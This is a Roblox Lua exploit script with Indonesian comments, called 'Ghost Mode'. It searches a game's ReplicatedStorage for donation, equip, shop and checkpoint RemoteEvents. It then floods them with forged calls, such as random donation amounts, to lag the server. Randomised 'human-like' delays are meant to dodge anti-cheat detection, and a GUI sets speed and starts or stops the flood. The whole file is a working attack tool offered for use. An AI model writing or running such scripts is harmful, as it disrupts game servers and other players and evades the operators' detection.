-- GHOST MODE - ULTRA STEALTH LAG
-- Pelan, konsisten, anti-detection
-- BAHASA INDONESIA

task.wait(5) -- Delay startup biar gak langsung detect

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui", 10)

if not playerGui then return end

-- Hapus GUI lama dengan delay
task.wait(1)
if playerGui:FindFirstChild("GhostModeGUI") then
    playerGui.GhostModeGUI:Destroy()
    task.wait(2)
end

-- ============================================
-- SETTINGS (Human-like)
-- ============================================
local Settings = {
    Running = false,
    Method = "Smart", -- Smart, Donation, Equip
    MinDelay = 0.5, -- Delay minimum (detik)
    MaxDelay = 2.0, -- Delay maximum (detik)
    PacketsPerCycle = 3, -- Sedikit per cycle
    Randomize = true, -- Random timing
}

-- ============================================
-- VARIABLES
-- ============================================
local targetRemote = nil
local ghostThread = nil
local totalPackets = 0
local startTime = 0

-- ============================================
-- NOTIFICATION (Silent mode)
-- ============================================
local function notif(msg, silent)
    if not silent then
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Ghost";
                Text = msg;
                Duration = 2;
            })
        end)
    end
    print("[Ghost]", msg)
end

-- ============================================
-- FIND BEST TARGET REMOTE
-- ============================================
local function findBestRemote()
    notif("🔍 Scanning silently...", true)
    
    local remotes = {}
    
    -- Scan ReplicatedStorage only (less suspicious)
    for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") then
            local name = obj.Name:lower()
            
            -- Priority remotes (paling mungkin work)
            if name:find("donat") then
                table.insert(remotes, {remote = obj, priority = 1, name = "Donation"})
            elseif name:find("equip") then
                table.insert(remotes, {remote = obj, priority = 2, name = "Equip"})
            elseif name:find("shop") or name:find("buy") then
                table.insert(remotes, {remote = obj, priority = 3, name = "Shop"})
            elseif name:find("checkpoint") or name:find("cp") then
                table.insert(remotes, {remote = obj, priority = 4, name = "Checkpoint"})
            end
        end
    end
    
    -- Sort by priority
    table.sort(remotes, function(a, b) return a.priority < b.priority end)
    
    if #remotes > 0 then
        targetRemote = remotes[1]
        notif("Target: " .. targetRemote.name, true)
        return true
    else
        notif("No target found", true)
        return false
    end
end

-- ============================================
-- GHOST LAG FUNCTION (Human-like)
-- ============================================
local function ghostLag()
    if not targetRemote then
        notif("❌ No target!")
        return
    end
    
    notif("👻 Ghost mode active...", true)
    
    ghostThread = task.spawn(function()
        while Settings.Running do
            -- Random delay (human-like)
            local delay = Settings.Randomize 
                and math.random(Settings.MinDelay * 100, Settings.MaxDelay * 100) / 100
                or Settings.MinDelay
            
            task.wait(delay)
            
            -- Send small packets (not suspicious)
            pcall(function()
                local remote = targetRemote.remote
                
                for i = 1, Settings.PacketsPerCycle do
                    -- Different patterns based on target
                    if targetRemote.name == "Donation" then
                        -- Donation spam (most effective)
                        local amount = math.random(100000, 999999)
                        remote:FireServer(amount)
                        remote:FireServer({amount = amount})
                        remote:FireServer("Donate", amount)
                        
                    elseif targetRemote.name == "Equip" then
                        -- Equip spam
                        remote:FireServer()
                        remote:FireServer("Tool")
                        remote:FireServer({action = "equip"})
                        
                    elseif targetRemote.name == "Shop" then
                        -- Shop spam
                        remote:FireServer("Buy", math.random(1, 999))
                        remote:FireServer({action = "purchase", id = math.random(1, 999)})
                        
                    elseif targetRemote.name == "Checkpoint" then
                        -- Checkpoint spam
                        remote:FireServer(math.random(1, 100))
                        remote:FireServer("TP", math.random(1, 100))
                        
                    else
                        -- Generic spam
                        remote:FireServer(math.random())
                        remote:FireServer({data = math.random()})
                    end
                    
                    totalPackets = totalPackets + Settings.PacketsPerCycle
                end
            end)
            
            -- Log setiap 30 detik (silent)
            if totalPackets % 50 == 0 then
                local elapsed = math.floor(tick() - startTime)
                print(string.format("[Ghost] %ds | Packets: %d | Rate: %.1f/s", 
                    elapsed, totalPackets, totalPackets / math.max(elapsed, 1)))
            end
        end
    end)
end

-- ============================================
-- MAIN FUNCTIONS
-- ============================================

local function startGhost()
    if Settings.Running then
        notif("Already running")
        return
    end
    
    -- Find target first
    if not findBestRemote() then
        notif("❌ No valid target!")
        return
    end
    
    Settings.Running = true
    totalPackets = 0
    startTime = tick()
    
    notif("👻 Ghost starting...")
    
    print("================================")
    print("GHOST MODE ACTIVATED")
    print("Target:", targetRemote.name)
    print("Method: Stealth")
    print("Delay:", Settings.MinDelay .. "-" .. Settings.MaxDelay .. "s")
    print("Packets/cycle:", Settings.PacketsPerCycle)
    print("================================")
    
    -- Start with delay (anti-detection)
    task.wait(3)
    
    ghostLag()
    
    notif("👻 Ghost active (silent)")
end

local function stopGhost()
    if not Settings.Running then
        notif("Not running")
        return
    end
    
    Settings.Running = false
    
    if ghostThread then
        pcall(function()
            task.cancel(ghostThread)
        end)
    end
    
    local elapsed = math.floor(tick() - startTime)
    local rate = totalPackets / math.max(elapsed, 1)
    
    notif("⏸️ Ghost stopped")
    
    print("================================")
    print("GHOST STOPPED")
    print("Duration:", elapsed, "seconds")
    print("Total packets:", totalPackets)
    print("Avg rate:", string.format("%.1f/s", rate))
    print("================================")
end

-- ============================================
-- CHANGE SETTINGS
-- ============================================

local function setSpeed(speed)
    if Settings.Running then
        notif("Stop first!")
        return
    end
    
    if speed == "Slow" then
        Settings.MinDelay = 1.0
        Settings.MaxDelay = 3.0
        Settings.PacketsPerCycle = 2
    elseif speed == "Medium" then
        Settings.MinDelay = 0.5
        Settings.MaxDelay = 1.5
        Settings.PacketsPerCycle = 3
    elseif speed == "Fast" then
        Settings.MinDelay = 0.2
        Settings.MaxDelay = 0.8
        Settings.PacketsPerCycle = 5
    end
    
    notif("Speed: " .. speed)
    print("Settings updated:")
    print("Delay:", Settings.MinDelay .. "-" .. Settings.MaxDelay)
    print("Packets/cycle:", Settings.PacketsPerCycle)
end

-- ============================================
-- CREATE GUI (Minimalist)
-- ============================================

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "GhostModeGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = playerGui

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 320, 0, 380)
MainFrame.Position = UDim2.new(0.5, -160, 0.5, -190)
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0, 12)
Corner.Parent = MainFrame

-- Header
local Header = Instance.new("Frame")
Header.Size = UDim2.new(1, 0, 0, 50)
Header.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
Header.BorderSizePixel = 0
Header.Parent = MainFrame

local HeaderCorner = Instance.new("UICorner")
HeaderCorner.CornerRadius = UDim.new(0, 12)
HeaderCorner.Parent = Header

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -60, 1, 0)
Title.Position = UDim2.new(0, 15, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "👻 GHOST MODE"
Title.TextColor3 = Color3.fromRGB(200, 200, 200)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 18
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = Header

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 45, 0, 45)
CloseBtn.Position = UDim2.new(1, -48, 0, 2.5)
CloseBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
CloseBtn.Text = "✕"
CloseBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextSize = 20
CloseBtn.Parent = Header

local CloseBtnCorner = Instance.new("UICorner")
CloseBtnCorner.CornerRadius = UDim.new(0, 8)
CloseBtnCorner.Parent = CloseBtn

CloseBtn.MouseButton1Click:Connect(function()
    stopGhost()
    ScreenGui:Destroy()
end)

-- Content
local Content = Instance.new("Frame")
Content.Size = UDim2.new(1, -30, 1, -65)
Content.Position = UDim2.new(0, 15, 0, 55)
Content.BackgroundTransparency = 1
Content.Parent = MainFrame

-- Speed Label
local SpeedLabel = Instance.new("TextLabel")
SpeedLabel.Size = UDim2.new(1, 0, 0, 35)
SpeedLabel.Position = UDim2.new(0, 0, 0, 0)
SpeedLabel.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
SpeedLabel.Text = "⚡ SPEED"
SpeedLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
SpeedLabel.Font = Enum.Font.GothamBold
SpeedLabel.TextSize = 14
SpeedLabel.Parent = Content

local SpeedLabelCorner = Instance.new("UICorner")
SpeedLabelCorner.CornerRadius = UDim.new(0, 8)
SpeedLabelCorner.Parent = SpeedLabel

-- Speed Buttons
local speeds = {"Slow", "Medium", "Fast"}
local speedColors = {
    Slow = Color3.fromRGB(100, 150, 100),
    Medium = Color3.fromRGB(150, 150, 100),
    Fast = Color3.fromRGB(150, 100, 100)
}

for i, speed in ipairs(speeds) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.31, 0, 0, 45)
    btn.Position = UDim2.new((i-1) * 0.34, 0, 0, 45)
    btn.BackgroundColor3 = speedColors[speed]
    btn.Text = speed
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 14
    btn.Parent = Content
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = btn
    
    btn.MouseButton1Click:Connect(function()
        setSpeed(speed)
    end)
end

-- Start Button
local StartBtn = Instance.new("TextButton")
StartBtn.Size = UDim2.new(1, 0, 0, 65)
StartBtn.Position = UDim2.new(0, 0, 0, 105)
StartBtn.BackgroundColor3 = Color3.fromRGB(80, 120, 80)
StartBtn.Text = "👻 START GHOST"
StartBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
StartBtn.Font = Enum.Font.GothamBold
StartBtn.TextSize = 20
StartBtn.Parent = Content

local StartBtnCorner = Instance.new("UICorner")
StartBtnCorner.CornerRadius = UDim.new(0, 10)
StartBtnCorner.Parent = StartBtn

StartBtn.MouseButton1Click:Connect(function()
    startGhost()
    StartBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    StartBtn.Text = "👻 RUNNING..."
end)

-- Stop Button
local StopBtn = Instance.new("TextButton")
StopBtn.Size = UDim2.new(1, 0, 0, 55)
StopBtn.Position = UDim2.new(0, 0, 0, 180)
StopBtn.BackgroundColor3 = Color3.fromRGB(120, 80, 80)
StopBtn.Text = "⏸️ STOP"
StopBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
StopBtn.Font = Enum.Font.GothamBold
StopBtn.TextSize = 18
StopBtn.Parent = Content

local StopBtnCorner = Instance.new("UICorner")
StopBtnCorner.CornerRadius = UDim.new(0, 10)
StopBtnCorner.Parent = StopBtn

StopBtn.MouseButton1Click:Connect(function()
    stopGhost()
    StartBtn.BackgroundColor3 = Color3.fromRGB(80, 120, 80)
    StartBtn.Text = "👻 START GHOST"
end)

-- Info
local Info = Instance.new("TextLabel")
Info.Size = UDim2.new(1, 0, 0, 75)
Info.Position = UDim2.new(0, 0, 1, -75)
Info.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Info.TextColor3 = Color3.fromRGB(180, 180, 180)
Info.Font = Enum.Font.Gotham
Info.TextSize = 11
Info.TextWrapped = true
Info.TextYAlignment = Enum.TextYAlignment.Top
Info.Text = [[👻 GHOST MODE - ULTRA STEALTH

• Pelan & konsisten
• Anti-detection pattern
• Human-like timing
• Single target focus

Tunggu 2-5 menit untuk efek!
Stats: Console (F9)]]
Info.Parent = Content

local InfoPadding = Instance.new("UIPadding")
InfoPadding.PaddingTop = UDim.new(0, 8)
InfoPadding.PaddingLeft = UDim.new(0, 8)
InfoPadding.PaddingRight = UDim.new(0, 8)
InfoPadding.Parent = Info

local InfoCorner = Instance.new("UICorner")
InfoCorner.CornerRadius = UDim.new(0, 8)
InfoCorner.Parent = Info

-- Silent startup
task.wait(2)
notif("👻 Ghost ready", true)
print("================================")
print("GHOST MODE")
print("Ultra stealth | Anti-detection")
print("================================")
